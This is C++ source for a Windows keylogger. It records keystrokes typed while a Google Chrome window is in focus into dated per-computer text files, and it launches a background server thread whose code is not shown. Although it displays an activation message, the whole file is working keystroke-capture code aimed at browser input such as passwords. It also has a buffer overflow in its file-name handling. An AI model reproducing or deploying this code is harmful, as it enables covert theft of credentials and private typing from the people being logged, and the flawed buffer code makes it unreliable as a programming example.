#include <iostream>
#include <Windows.h>
#include <ctime>
#include <locale>
#include <codecvt>
#include <string>
#include <fstream>
#include <time.h>
#include <wtsapi32.h>
#include <dirent.h>
#include <csignal>
#include <vector>
#include <unordered_map>
#include <thread>
#include <atomic>
#include <sstream>
#include "keylogger_utils.h"
#include "server.h"

#define _UNICODE

using std::fstream;
using std::cout;
using std::endl;
using std::wcout;
using std::wstring;
using std::string;

std::wofstream outFile;
std::atomic<bool> isLogging(false);
std::wstring logBuffer;

void signalHandler(int signum) {
    wcout << L"Interruption du programme. Fermeture du fichier..." << endl;
    if (outFile.is_open()) {
        outFile.close();
    }
    exit(signum);
}

int existDir(char* rp, char* rf) {
    DIR *dir;
    struct dirent *diread;
    if ((dir = opendir(rp)) != nullptr) {
        while ((diread = readdir(dir)) != nullptr) {
            cout << "File found: " << diread->d_name << endl;
            if (strcmp(diread->d_name, rf) == 0) {
                return 0;
            }
        }
    }
    return 1;
}

void ShowActivationMessage() {
    MessageBoxW(NULL, L"Keylogger activé. Toutes les frappes au clavier seront enregistrées.", L"Keylogger Activé", MB_OK | MB_ICONINFORMATION);
}

void startLogging() {
    const wchar_t* targetWindowTitle = L"Google Chrome";
    const int buffer_size = 256;
    const char* pathMain = "./";

    char* path_desk;
    DWORD dbuffer_size = 256;
    char desktopName[buffer_size];

    fstream file;
    time_t day = time(0);
    tm *t = localtime(&day);

    char today[30];
    strftime(today, sizeof(today), "%A, %Y-%m-%d", t);
    char* resFileName;

    if (GetComputerNameA(desktopName, &dbuffer_size)) {
        CreateDirectoryA(desktopName, nullptr);
    }

    char* resultPath = new char[strlen(pathMain) + strlen(desktopName) + 1];
    char* resultFileName = new char[strlen(today) + strlen(desktopName) + 1];

    strcpy(resultFileName, desktopName);
    strcat(resultFileName, today);
    strcat(resultFileName, ".txt");

    strcpy(resultPath, pathMain);
    strcat(resultPath, desktopName);

    char* resultPathAll = new char[strlen(resultPath) + strlen(resultFileName) + 2];

    strcpy(resultPathAll, resultPath);
    strcat(resultPathAll, "/");
    strcat(resultPathAll, resultFileName);

    cout << "Test PathAll: " << resultPathAll << endl;
    cout << "Current Path: " << resultPath << endl;

    outFile.open(resultPathAll, std::ios::app);

    signal(SIGINT, signalHandler);

    if (existDir(resultPath, resultFileName) == 0) {
        cout << "Dossier deja trouve" << endl;
    } else {
        cout << "Creation du dossier" << endl;
    }

    isLogging = true;

    while (isLogging) {
        HWND foregroundWindow = GetForegroundWindow();
        wchar_t windowTitle[buffer_size];

        if (GetWindowTextW(foregroundWindow, windowTitle, buffer_size) > 0 && wcsstr(windowTitle, targetWindowTitle)) {
            for (int i = 8; i <= 255; ++i) {
                if (GetAsyncKeyState(i) == -32767) {
                    if (IsSpecialKey(i)) {
                        if (i == VK_SHIFT || i == VK_CONTROL || i == VK_MENU) {
                        continue; 
                        }
                        if (i == VK_BACK && !logBuffer.empty()) {
                            logBuffer.pop_back();
                            
                            outFile.close();
                            outFile.open(resultPathAll, std::ios::out | std::ios::trunc);
                            outFile << logBuffer;
                            outFile.flush();
                        }
                        continue;
                    }
                    bool isShiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
                    bool isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                    wchar_t character = GetCharacterFromKey(i, isShiftPressed, isCapsLockOn);
                    if (character != L'\0') { // Ignore invalid characters
                        logBuffer.push_back(character);
                        outFile << character;
                        outFile.flush();

                        // Print the character to the console for debugging
                        wcout << L"Captured character: " << character << L" (" << std::hex << i << L")" << endl;
                    }
                }
            }
            Sleep(10);
        }
    }
    outFile.close();
}

void stopLogging() {
    std::cout << "stopLogging called" << std::endl;
    isLogging = false;
    if (outFile.is_open()) {
        outFile.close();
        std::cout << "File closed" << std::endl;
    }
}

int main() {
    ShowActivationMessage();

    std::thread serverThread(startServer);
    serverThread.detach();

    while (true) {
        Sleep(1000);
    }

    return 0;
}
